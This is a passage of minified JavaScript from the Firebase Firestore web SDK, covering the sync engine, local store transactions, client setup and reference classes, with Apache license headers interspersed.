n(e)-n(t)}(e.type,t.type)||this.Ku(e.doc,t.doc))),this.Hu(n);let s=t?this.Ju():[],a=0===this.Uu.size&&this.current?1:0,o=a!==this.qu;return this.qu=a,0!==i.length||o?{snapshot:new Uo(this.query,e.Gu,r,i,e.mutatedKeys,0===a,o,!1,!!n&&n.resumeToken.approximateByteSize()>0),Yu:s}:{Yu:s}}Ru(e){return this.current&&"Offline"===e?(this.current=!1,this.applyChanges({Gu:this.Gu,ju:new Fo,mutatedKeys:this.mutatedKeys,Mi:!1},!1)):{Yu:[]}}Zu(e){return!this.Lu.has(e)&&!!this.Gu.has(e)&&!this.Gu.get(e).hasLocalMutations}Hu(e){e&&(e.addedDocuments.forEach((e=>this.Lu=this.Lu.add(e))),e.modifiedDocuments.forEach((e=>{})),e.removedDocuments.forEach((e=>this.Lu=this.Lu.delete(e))),this.current=e.current)}Ju(){if(!this.current)return[];let e=this.Uu;this.Uu=us(),this.Gu.forEach((e=>{this.Zu(e.key)&&(this.Uu=this.Uu.add(e.key))}));let t=[];return e.forEach((e=>{this.Uu.has(e)||t.push(new Wo(e))})),this.Uu.forEach((n=>{e.has(n)||t.push(new Ho(n))})),t}Xu(e){this.Lu=e.Wi,this.Uu=us();let t=this.zu(e.documents);return this.applyChanges(t,!0)}tc(){return Uo.fromInitialDocuments(this.query,this.Gu,this.mutatedKeys,0===this.qu,this.hasCachedResults)}}class Jo{constructor(e,t,n){this.query=e,this.targetId=t,this.view=n}}class Xo{constructor(e){this.key=e,this.ec=!1}}class Yo{constructor(e,t,n,r,i,s){this.localStore=e,this.remoteStore=t,this.eventManager=n,this.sharedClientState=r,this.currentUser=i,this.maxConcurrentLimboResolutions=s,this.nc={},this.sc=new ts((e=>Xi(e)),Ji),this.ic=new Map,this.rc=new Set,this.oc=new jr(Or.comparator),this.uc=new Map,this.cc=new Ca,this.ac={},this.hc=new Map,this.lc=Ea.bn(),this.onlineState="Unknown",this.fc=void 0}get isPrimaryClient(){return!0===this.fc}}async function Zo(e,t){let n,r,i=function(e){let t=e;return t.remoteStore.remoteSyncer.applyRemoteEvent=nl.bind(null,t),t.remoteStore.remoteSyncer.getRemoteKeysForTarget=ml.bind(null,t),t.remoteStore.remoteSyncer.rejectListen=il.bind(null,t),t.nc.zo=$o.bind(null,t.eventManager),t.nc.wc=zo.bind(null,t.eventManager),t}(e),s=i.sc.get(t);if(s)n=s.targetId,i.sharedClientState.addLocalQueryTarget(n),r=s.view.tc();else{let e=await function(e,t){let n=e;return n.persistence.runTransaction("Allocate target","readwrite",(e=>{let r;return n.Ds.getTargetData(e,t).next((i=>i?(r=i,xr.resolve(r)):n.Ds.allocateTargetId(e).next((i=>(r=new ya(t,i,0,e.currentSequenceNumber),n.Ds.addTargetData(e,r).next((()=>r)))))))})).then((e=>{let r=n.Li.get(e.targetId);return(null===r||e.snapshotVersion.compareTo(r.snapshotVersion)>0)&&(n.Li=n.Li.insert(e.targetId,e),n.qi.set(t,e.targetId)),e}))}(i.localStore,Hi(t));i.isPrimaryClient&&ho(i.remoteStore,e);let s=i.sharedClientState.addLocalQueryTarget(e.targetId);n=e.targetId,r=await async function(e,t,n,r,i){e.dc=(t,n,r)=>async function(e,t,n,r){let i=t.view.zu(n);i.Mi&&(i=await $a(e.localStore,t.query,!1).then((({documents:e})=>t.view.zu(e,i))));let s=r&&r.targetChanges.get(t.targetId),a=t.view.applyChanges(i,e.isPrimaryClient,s);return hl(e,t.targetId,a.Yu),a.snapshot}(e,t,n,r);let s=await $a(e.localStore,t,!0),a=new Qo(t,s.Wi),o=a.zu(s.documents),l=Gs.createSynthesizedTargetChangeForCurrentChange(n,r&&"Offline"!==e.onlineState,i),u=a.applyChanges(o,e.isPrimaryClient,l);hl(e,n,u.Yu);let c=new Jo(t,n,a);return e.sc.set(t,c),e.ic.has(n)?e.ic.get(n).push(t):e.ic.set(n,[t]),u.snapshot}(i,t,n,"current"===s,e.resumeToken)}return r}async function el(e,t){let n=e.sc.get(t),r=e.ic.get(n.targetId);if(r.length>1)return e.ic.set(n.targetId,r.filter((e=>!Ji(e,t)))),void e.sc.delete(t);e.isPrimaryClient?(e.sharedClientState.removeLocalQueryTarget(n.targetId),e.sharedClientState.isActiveQueryTarget(n.targetId)||await qa(e.localStore,n.targetId,!1).then((()=>{e.sharedClientState.clearQueryState(n.targetId),fo(e.remoteStore,n.targetId),ul(e,n.targetId)})).catch(Rr)):(ul(e,n.targetId),await qa(e.localStore,n.targetId,!0))}async function tl(e,t,n){let r=function(e){let t=e;return t.remoteStore.remoteSyncer.applySuccessfulWrite=sl.bind(null,t),t.remoteStore.remoteSyncer.rejectFailedWrite=al.bind(null,t),t}(e);try{var i,s;let e,a=await function(e,t){let n,r,i=Tr.now(),s=t.reduce(((e,t)=>e.add(t.key)),us());return e.persistence.runTransaction("Locally write mutations","readwrite",(a=>{let o=ns,l=us();return e.Ki.getEntries(a,s).next((e=>{(o=e).forEach(((e,t)=>{t.isValidDocument()||(l=l.add(e))}))})).next((()=>e.localDocuments.getOverlayedDocuments(a,o))).next((r=>{n=r;let s=[];for(let e of t){let t=function(e,t){let n=null;for(let r of e.fieldTransforms){let e=t.data.field(r.field),i=ps(r.transform,e||null);null!=i&&(null===n&&(n=yi.empty()),n.set(r.field,i))}return n||null}(e,n.get(e.key).overlayedDocument);null!=t&&s.push(new Ds(e.key,t,function e(t){let n=[];return Ur(t.fields,((t,r)=>{let i=new Nr([t]);if(pi(r)){let t=e(r.mapValue).fields;if(0===t.length)n.push(i);else for(let e of t)n.push(i.child(e))}else n.push(i)})),new Gr(n)}(t.value.mapValue),Ts.exists(!0)))}return e.mutationQueue.addMutationBatch(a,i,s,t)})).next((t=>{r=t;let i=t.applyToLocalDocumentSet(n,l);return e.documentOverlayCache.saveOverlays(a,t.batchId,i)}))})).then((()=>({batchId:r.batchId,changes:ss(n)})))}(r.localStore,t);r.sharedClientState.addPendingMutation(a.batchId),i=r,s=a.batchId,(e=i.ac[i.currentUser.toKey()])||(e=new jr(Ir)),e=e.insert(s,n),i.ac[i.currentUser.toKey()]=e,await fl(r,a.changes),await To(r.remoteStore)}catch(t){let e=Lo(t,"Failed to persist write");n.reject(e)}}async function nl(e,t){try{let n=await function(e,t){let n=e,r=t.snapshotVersion,i=n.Li;return n.persistence.runTransaction("Apply remote event","readwrite-primary",(e=>{var s;let a,o,l=n.Ki.newChangeBuffer({trackRemovals:!0});i=n.Li;let u=[];t.targetChanges.forEach(((s,a)=>{var o;let l=i.get(a);if(!l)return;u.push(n.Ds.removeMatchingKeys(e,s.removedDocuments,a).next((()=>n.Ds.addMatchingKeys(e,s.addedDocuments,a))));let c=l.withSequenceNumber(e.currentSequenceNumber);t.targetMismatches.has(a)?c=c.withResumeToken(Hr.EMPTY_BYTE_STRING,Sr.min()).withLastLimboFreeSnapshotVersion(Sr.min()):s.resumeToken.approximateByteSize()>0&&(c=c.withResumeToken(s.resumeToken,r)),i=i.insert(a,c),o=c,(0===l.resumeToken.approximateByteSize()||o.snapshotVersion.toMicroseconds()-l.snapshotVersion.toMicroseconds()>=3e8||s.addedDocuments.size+s.modifiedDocuments.size+s.removedDocuments.size>0)&&u.push(n.Ds.updateTargetData(e,c))}));let c=ns,h=us();if(t.documentUpdates.forEach((r=>{t.resolvedLimboDocuments.has(r)&&u.push(n.persistence.referenceDelegate.updateLimboDocument(e,r))})),u.push((s=t.documentUpdates,a=us(),o=us(),s.forEach((e=>a=a.add(e))),l.getEntries(e,a).next((e=>{let t=ns;return s.forEach(((n,r)=>{let i=e.get(n);r.isFoundDocument()!==i.isFoundDocument()&&(o=o.add(n)),r.isNoDocument()&&r.version.isEqual(Sr.min())?(l.removeEntry(n,r.readTime),t=t.insert(n,r)):!i.isValidDocument()||r.version.compareTo(i.version)>0||0===r.version.compareTo(i.version)&&i.hasPendingWrites?(l.addEntry(r),t=t.insert(n,r)):sr("LocalStore","Ignoring outdated watch update for ",n,". Current version:",i.version," Watch version:",r.version)})),{zi:t,ji:o}}))).next((e=>{c=e.zi,h=e.ji}))),!r.isEqual(Sr.min())){let t=n.Ds.getLastRemoteSnapshotVersion(e).next((t=>n.Ds.setTargetsMetadata(e,e.currentSequenceNumber,r)));u.push(t)}return xr.waitFor(u).next((()=>l.apply(e))).next((()=>n.localDocuments.getLocalViewOfDocuments(e,c,h))).next((()=>c))})).then((e=>(n.Li=i,e)))}(e.localStore,t);t.targetChanges.forEach(((t,n)=>{let r=e.uc.get(n);r&&(t.addedDocuments.size+t.modifiedDocuments.size+t.removedDocuments.size<=1||ur(),t.addedDocuments.size>0?r.ec=!0:t.modifiedDocuments.size>0?r.ec||ur():t.removedDocuments.size>0&&(r.ec||ur(),r.ec=!1))})),await fl(e,n,t)}catch(e){await Rr(e)}}function rl(e,t,n){let r=e;if(r.isPrimaryClient&&0===n||!r.isPrimaryClient&&1===n){let e=[];r.sc.forEach(((n,r)=>{let i=r.view.Ru(t);i.snapshot&&e.push(i.snapshot)})),function(e,t){let n=e;n.onlineState=t;let r=!1;n.queries.forEach(((e,n)=>{for(let e of n.listeners)e.Ru(t)&&(r=!0)})),r&&Go(n)}(r.eventManager,t),e.length&&r.nc.zo(e),r.onlineState=t,r.isPrimaryClient&&r.sharedClientState.setOnlineState(t)}}async function il(e,t,n){let r=e;r.sharedClientState.updateQueryState(t,"rejected",n);let i=r.uc.get(t),s=i&&i.key;if(s){let e=new jr(Or.comparator);e=e.insert(s,vi.newNoDocument(s,Sr.min()));let n=us().add(s),i=new zs(Sr.min(),new Map,new $r(Ir),e,n);await nl(r,i),r.oc=r.oc.remove(s),r.uc.delete(t),dl(r)}else await qa(r.localStore,t,!1).then((()=>ul(r,t,n))).catch(Rr)}async function sl(e,t){var n;let r=t.batch.batchId;try{let i=await(n=e.localStore).persistence.runTransaction("Acknowledge batch","readwrite-primary",(e=>{let r=t.batch.keys(),i=n.Ki.newChangeBuffer({trackRemovals:!0});return function(e,t,n,r){let i=n.batch,s=i.keys(),a=xr.resolve();return s.forEach((e=>{a=a.next((()=>r.getEntry(t,e))).next((t=>{let s=n.docVersions.get(e);null!==s||ur(),0>t.version.compareTo(s)&&(i.applyToRemoteDocument(t,n),t.isValidDocument()&&(t.setReadTime(n.commitVersion),r.addEntry(t)))}))})),a.next((()=>e.mutationQueue.removeMutationBatch(t,i)))}(n,e,t,i).next((()=>i.apply(e))).next((()=>n.mutationQueue.performConsistencyCheck(e))).next((()=>n.documentOverlayCache.removeOverlaysForBatchId(e,r,t.batch.batchId))).next((()=>n.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(e,function(e){let t=us();for(let n=0;n<e.mutationResults.length;++n)e.mutationResults[n].transformResults.length>0&&(t=t.add(e.batch.mutations[n].key));return t}(t)))).next((()=>n.localDocuments.getDocuments(e,r)))}));ll(e,r,null),ol(e,r),e.sharedClientState.updateMutationState(r,"acknowledged"),await fl(e,i)}catch(e){await Rr(e)}}async function al(e,t,n){var r;try{let i=await(r=e.localStore).persistence.runTransaction("Reject batch","readwrite-primary",(e=>{let n;return r.mutationQueue.lookupMutationBatch(e,t).next((t=>(null!==t||ur(),n=t.keys(),r.mutationQueue.removeMutationBatch(e,t)))).next((()=>r.mutationQueue.performConsistencyCheck(e))).next((()=>r.documentOverlayCache.removeOverlaysForBatchId(e,n,t))).next((()=>r.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(e,n))).next((()=>r.localDocuments.getDocuments(e,n)))}));ll(e,t,n),ol(e,t),e.sharedClientState.updateMutationState(t,"rejected",n),await fl(e,i)}catch(e){await Rr(e)}}function ol(e,t){(e.hc.get(t)||[]).forEach((e=>{e.resolve()})),e.hc.delete(t)}function ll(e,t,n){let r=e,i=r.ac[r.currentUser.toKey()];if(i){let e=i.get(t);e&&(n?e.reject(n):e.resolve(),i=i.remove(t)),r.ac[r.currentUser.toKey()]=i}}function ul(e,t,n=null){for(let r of(e.sharedClientState.removeLocalQueryTarget(t),e.ic.get(t)))e.sc.delete(r),n&&e.nc.wc(r,n);e.ic.delete(t),e.isPrimaryClient&&e.cc.hs(t).forEach((t=>{e.cc.containsKey(t)||cl(e,t)}))}function cl(e,t){e.rc.delete(t.path.canonicalString());let n=e.oc.get(t);null!==n&&(fo(e.remoteStore,n),e.oc=e.oc.remove(t),e.uc.delete(n),dl(e))}function hl(e,t,n){for(let r of n)r instanceof Ho?(e.cc.addReference(r.key,t),function(e,t){let n=t.key,r=n.path.canonicalString();e.oc.get(n)||e.rc.has(r)||(sr("SyncEngine","New document in limbo: "+n),e.rc.add(r),dl(e))}(e,r)):r instanceof Wo?(sr("SyncEngine","Document no longer in limbo: "+r.key),e.cc.removeReference(r.key,t),e.cc.containsKey(r.key)||cl(e,r.key)):ur()}function dl(e){for(;e.rc.size>0&&e.oc.size<e.maxConcurrentLimboResolutions;){var t;let n=e.rc.values().next().value;e.rc.delete(n);let r=new Or(Ar.fromString(n)),i=e.lc.next();e.uc.set(i,new Xo(r)),e.oc=e.oc.insert(r,i),ho(e.remoteStore,new ya(Hi((t=r.path,new Bi(t))),i,2,Lr.ct))}}async function fl(e,t,n){let r=[],i=[],s=[];e.sc.isEmpty()||(e.sc.forEach(((a,o)=>{s.push(e.dc(o,t,n).then((t=>{if((t||n)&&e.isPrimaryClient&&e.sharedClientState.updateQueryState(o.targetId,(null==t?void 0:t.fromCache)?"not-current":"current"),t){r.push(t);let e=Fa.Di(o.targetId,t);i.push(e)}})))})),await Promise.all(s),e.nc.zo(r),await async function(e,t){let n=e;try{await n.persistence.runTransaction("notifyLocalViewChanges","readwrite",(e=>xr.forEach(t,(t=>xr.forEach(t.Vi,(r=>n.persistence.referenceDelegate.addReference(e,t.targetId,r))).next((()=>xr.forEach(t.Si,(r=>n.persistence.referenceDelegate.removeReference(e,t.targetId,r)))))))))}catch(e){if(!Pr(e))throw e;sr("LocalStore","Failed to update sequence numbers: "+e)}for(let e of t){let t=e.targetId;if(!e.fromCache){let e=n.Li.get(t),r=e.snapshotVersion,i=e.withLastLimboFreeSnapshotVersion(r);n.Li=n.Li.insert(t,i)}}}(e.localStore,i))}async function pl(e,t){let n=e;if(!n.currentUser.isEqual(t)){sr("SyncEngine","User change. New user:",t.toKey());let e=await ja(n.localStore,t);n.currentUser=t,n.hc.forEach((e=>{e.forEach((e=>{e.reject(new hr(cr.CANCELLED,"'waitForPendingWrites' promise is rejected due to a user change."))}))})),n.hc.clear(),n.sharedClientState.handleUserChange(t,e.removedBatchIds,e.addedBatchIds),await fl(n,e.Qi)}}function ml(e,t){let n=e.uc.get(t);if(n&&n.ec)return us().add(n.key);{let n=us(),r=e.ic.get(t);if(!r)return n;for(let t of r){let r=e.sc.get(t);n=n.unionWith(r.view.Qu)}return n}}class gl{constructor(){this.synchronizeTabs=!1}async initialize(e){this.serializer=to(e.databaseInfo.databaseId),this.sharedClientState=this.createSharedClientState(e),this.persistence=this.createPersistence(e),await this.persistence.start(),this.localStore=this.createLocalStore(e),this.gcScheduler=this.createGarbageCollectionScheduler(e,this.localStore),this.indexBackfillerScheduler=this.createIndexBackfillerScheduler(e,this.localStore)}createGarbageCollectionScheduler(e,t){return null}createIndexBackfillerScheduler(e,t){return null}createLocalStore(e){var t,n,r,i;return t=this.persistence,n=new Ua,r=e.initialUser,i=this.serializer,new Va(t,n,r,i)}createPersistence(e){return new Pa(Ma.Fs,this.serializer)}createSharedClientState(e){return new Ga}async terminate(){this.gcScheduler&&this.gcScheduler.stop(),await this.sharedClientState.shutdown(),await this.persistence.shutdown()}}class yl{async initialize(e,t){this.localStore||(this.localStore=e.localStore,this.sharedClientState=e.sharedClientState,this.datastore=this.createDatastore(t),this.remoteStore=this.createRemoteStore(t),this.eventManager=this.createEventManager(t),this.syncEngine=this.createSyncEngine(t,!e.synchronizeTabs),this.sharedClientState.onlineStateHandler=e=>rl(this.syncEngine,e,1),this.remoteStore.remoteSyncer.handleCredentialChange=pl.bind(null,this.syncEngine),await async function(e,t){t?(e.du.delete(2),await uo(e)):t||(e.du.add(2),await co(e),e.mu.set("Unknown"))}(this.remoteStore,this.syncEngine.isPrimaryClient))}createEventManager(e){return new jo}createDatastore(e){var t,n,r;let i=to(e.databaseInfo.databaseId),s=(t=e.databaseInfo,new Za(t));return n=e.authCredentials,r=e.appCheckCredentials,new ao(n,r,s,i)}createRemoteStore(e){var t,n,r,i,s;return t=this.localStore,n=this.datastore,r=e.asyncQueue,i=e=>rl(this.syncEngine,e,0),s=Ha.D()?new Ha:new Ka,new lo(t,n,r,i,s)}createSyncEngine(e,t){return function(e,t,n,r,i,s,a){let o=new Yo(e,t,n,r,i,s);return a&&(o.fc=!0),o}(this.localStore,this.remoteStore,this.eventManager,this.sharedClientState,e.initialUser,e.maxConcurrentLimboResolutions,t)}terminate(){return async function(e){sr("RemoteStore","RemoteStore shutting down."),e.du.add(5),await co(e),e._u.shutdown(),e.mu.set("Unknown")}(this.remoteStore)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vl{constructor(e){this.observer=e,this.muted=!1}next(e){this.observer.next&&this.gc(this.observer.next,e)}error(e){this.observer.error?this.gc(this.observer.error,e):ar("Uncaught Error in snapshot listener:",e.toString())}yc(){this.muted=!0}gc(e,t){this.muted||setTimeout((()=>{this.muted||e(t)}),0)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wl{constructor(e,t,n,r){this.authCredentials=e,this.appCheckCredentials=t,this.asyncQueue=n,this.databaseInfo=r,this.user=tr.UNAUTHENTICATED,this.clientId=_r.A(),this.authCredentialListener=()=>Promise.resolve(),this.appCheckCredentialListener=()=>Promise.resolve(),this.authCredentials.start(n,(async e=>{sr("FirestoreClient","Received user=",e.uid),await this.authCredentialListener(e),this.user=e})),this.appCheckCredentials.start(n,(e=>(sr("FirestoreClient","Received new app check token=",e),this.appCheckCredentialListener(e,this.user))))}async getConfiguration(){return{asyncQueue:this.asyncQueue,databaseInfo:this.databaseInfo,clientId:this.clientId,authCredentials:this.authCredentials,appCheckCredentials:this.appCheckCredentials,initialUser:this.user,maxConcurrentLimboResolutions:100}}setCredentialChangeListener(e){this.authCredentialListener=e}setAppCheckTokenChangeListener(e){this.appCheckCredentialListener=e}verifyNotTerminated(){if(this.asyncQueue.isShuttingDown)throw new hr(cr.FAILED_PRECONDITION,"The client has already been terminated.")}terminate(){this.asyncQueue.enterRestrictedMode();let e=new dr;return this.asyncQueue.enqueueAndForgetEvenWhileRestricted((async()=>{try{this._onlineComponents&&await this._onlineComponents.terminate(),this._offlineComponents&&await this._offlineComponents.terminate(),this.authCredentials.shutdown(),this.appCheckCredentials.shutdown(),e.resolve()}catch(t){let n=Lo(t,"Failed to shutdown persistence");e.reject(n)}})),e.promise}}async function bl(e,t){e.asyncQueue.verifyOperationInProgress(),sr("FirestoreClient","Initializing OfflineComponentProvider");let n=await e.getConfiguration();await t.initialize(n);let r=n.initialUser;e.setCredentialChangeListener((async e=>{r.isEqual(e)||(await ja(t.localStore,e),r=e)})),t.persistence.setDatabaseDeletedListener((()=>e.terminate())),e._offlineComponents=t}async function _l(e,t){e.asyncQueue.verifyOperationInProgress();let n=await async function(e){if(!e._offlineComponents)if(e._uninitializedComponentsProvider){sr("FirestoreClient","Using user provided OfflineComponentProvider");try{await bl(e,e._uninitializedComponentsProvider._offline)}catch(t){if(!("FirebaseError"===t.name?t.code===cr.FAILED_PRECONDITION||t.code===cr.UNIMPLEMENTED:!("undefined"!=typeof DOMException&&t instanceof DOMException)||22===t.code||20===t.code||11===t.code))throw t;or("Error using user provided cache. Falling back to memory cache: "+t),await bl(e,new gl)}}else sr("FirestoreClient","Using default OfflineComponentProvider"),await bl(e,new gl);return e._offlineComponents}(e);sr("FirestoreClient","Initializing OnlineComponentProvider");let r=await e.getConfiguration();await t.initialize(n,r),e.setCredentialChangeListener((e=>Do(t.remoteStore,e))),e.setAppCheckTokenChangeListener(((e,n)=>Do(t.remoteStore,n))),e._onlineComponents=t}async function Il(e){return e._onlineComponents||(e._uninitializedComponentsProvider?(sr("FirestoreClient","Using user provided OnlineComponentProvider"),await _l(e,e._uninitializedComponentsProvider._online)):(sr("FirestoreClient","Using default OnlineComponentProvider"),await _l(e,new yl))),e._onlineComponents}async function El(e){let t=await Il(e),n=t.eventManager;return n.onListen=Zo.bind(null,t.syncEngine),n.onUnlisten=el.bind(null,t.syncEngine),n}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Tl=new Map;
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Sl(e,t,n){if(!n)throw new hr(cr.INVALID_ARGUMENT,`Function ${e}() cannot be called with an empty ${t}.`)}function kl(e){if(!Or.isDocumentKey(e))throw new hr(cr.INVALID_ARGUMENT,`Invalid document reference. Document references must have an even number of segments, but ${e} has ${e.length}.`)}function Al(e){if(Or.isDocumentKey(e))throw new hr(cr.INVALID_ARGUMENT,`Invalid collection reference. Collection references must have an odd number of segments, but ${e} has ${e.length}.`)}function Cl(e){if(void 0===e)return"undefined";if(null===e)return"null";if("string"==typeof e)return e.length>20&&(e=`${e.substring(0,20)}...`),JSON.stringify(e);if("number"==typeof e||"boolean"==typeof e)return""+e;if("object"==typeof e){if(e instanceof Array)return"an array";{var t;let n=(t=e).constructor?t.constructor.name:null;return n?`a custom ${n} object`:"an object"}}return"function"==typeof e?"a function":ur()}function Nl(e,t){if("_delegate"in e&&(e=e._delegate),!(e instanceof t)){if(t.name===e.constructor.name)throw new hr(cr.INVALID_ARGUMENT,"Type does not match the expected instance. Did you pass a reference from a different Firestore SDK?");{let n=Cl(e);throw new hr(cr.INVALID_ARGUMENT,`Expected type '${t.name}', but it was: ${n}`)}}return e}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ol{constructor(e){var t;if(void 0===e.host){if(void 0!==e.ssl)throw new hr(cr.INVALID_ARGUMENT,"Can't provide ssl option if host option is not set");this.host="firestore.googleapis.com",this.ssl=!0}else this.host=e.host,this.ssl=null===(t=e.ssl)||void 0===t||t;if(this.credentials=e.credentials,this.ignoreUndefinedProperties=!!e.ignoreUndefinedProperties,this.cache=e.localCache,void 0===e.cacheSizeBytes)this.cacheSizeBytes=41943040;else{if(-1!==e.cacheSizeBytes&&e.cacheSizeBytes<1048576)throw new hr(cr.INVALID_ARGUMENT,"cacheSizeBytes must be at least 1048576");this.cacheSizeBytes=e.cacheSizeBytes}this.experimentalForceLongPolling=!!e.experimentalForceLongPolling,this.experimentalAutoDetectLongPolling=!!e.experimentalAutoDetectLongPolling,this.useFetchStreams=!!e.useFetchStreams,function(e,t,n,r){if(!0===t&&!0===r)throw new hr(cr.INVALID_ARGUMENT,"experimentalForceLongPolling and experimentalAutoDetectLongPolling cannot be used together.")}(0,e.experimentalForceLongPolling,0,e.experimentalAutoDetectLongPolling)}isEqual(e){return this.host===e.host&&this.ssl===e.ssl&&this.credentials===e.credentials&&this.cacheSizeBytes===e.cacheSizeBytes&&this.experimentalForceLongPolling===e.experimentalForceLongPolling&&this.experimentalAutoDetectLongPolling===e.experimentalAutoDetectLongPolling&&this.ignoreUndefinedProperties===e.ignoreUndefinedProperties&&this.useFetchStreams===e.useFetchStreams}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Dl{constructor(e,t,n,r){this._authCredentials=e,this._appCheckCredentials=t,this._databaseId=n,this._app=r,this.type="firestore-lite",this._persistenceKey="(lite)",this._settings=new Ol({}),this._settingsFrozen=!1}get app(){if(!this._app)throw new hr(cr.FAILED_PRECONDITION,"Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._app}get _initialized(){return this._settingsFrozen}get _terminated(){return void 0!==this._terminateTask}_setSettings(e){if(this._settingsFrozen)throw new hr(cr.FAILED_PRECONDITION,"Firestore has already been started and its settings can no longer be changed. You can only modify settings before calling any other methods on a Firestore object.");this._settings=new Ol(e),void 0!==e.credentials&&(this._authCredentials=function(e){if(!e)return new pr;switch(e.type){case"firstParty":return new vr(e.sessionIndex||"0",e.iamToken||null,e.authTokenFactory||null);case"provider":return e.client;default:throw new hr(cr.INVALID_ARGUMENT,"makeAuthCredentialsProvider failed due to invalid credential type")}}(e.credentials))}_getSettings(){return this._settings}_freezeSettings(){return this._settingsFrozen=!0,this._settings}_delete(){return this._terminateTask||(this._terminateTask=this._terminate()),this._terminateTask}toJSON(){return{app:this._app,databaseId:this._databaseId,settings:this._settings}}_terminate(){return function(e){let t=Tl.get(e);t&&(sr("ComponentProvider","Removing Datastore"),Tl.delete(e),t.terminate())}(this),Promise.resolve()
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class Rl{constructor(e,t,n){this.converter=t,this._key=n,this.type="document",this.firestore=e}get _path(){return this._key.path}get id(){return this._key.path.lastSegment()}get path(){return this._key.path.canonicalString()}get parent(){return new Pl(this.firestore,this.converter,this._key.path.popLast())}withConverter(e){return new Rl(this.firestore,e,this._key)}}class xl{constructor(e,t,n){this.converter=t,this._query=n,this.type="query",this.firestore=e}withConverter(e){return new xl(this.firestore,e,this._query)}}class Pl extends xl{constructor(e,t,n){super(e,t,new Bi(n)),this._path=n,this.type="collection"}get id(){return this._query.path.lastSegment()}get path(){return this._query.path.canonicalString()}get parent(){let e=this._path.popLast();return e.isEmpty()?null:new Rl(this.firestore,null,new Or(e))}withConverter(e){return new Pl(this.firestore,e,this._path)}}function Ll(e,t,...n){if(e=(0,f.m9)(e),Sl("collection","path",t),e instanceof Dl){let r=Ar.fromString(t,...n);return Al(r),new Pl(e,null,r)}{if(!(e instanceof Rl||e instanceof Pl))throw new hr(cr.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");let r=e._path.child(Ar.fromString(t,...n));return Al(r),new Pl(e.firestore,null,r)}}function Ml(e,t){if(e=Nl(e,Dl),Sl("collectionGroup","collection id",t),t.indexOf("/")>=0)throw new hr(cr.INVALID_ARGUMENT,`Invalid collection ID '${t}' passed to function collectionGroup(). Collection IDs must not contain '/'.`);return new xl(e,null,new Bi(Ar.emptyPath(),t))}function Fl(e,t,...n){if(e=(0,f.m9)(e),1==arguments.length&&(t=_r.A()),Sl("doc","path",t),e instanceof Dl){let r=Ar.fromString(t,...n);return kl(r),new Rl(e,null,new Or(r))}{if(!(e instanceof Rl||e instanceof Pl))throw new hr(cr.INVALID_ARGUMENT,"Expected first argument to collection() to be a CollectionReference, a DocumentReference or FirebaseFirestore");let 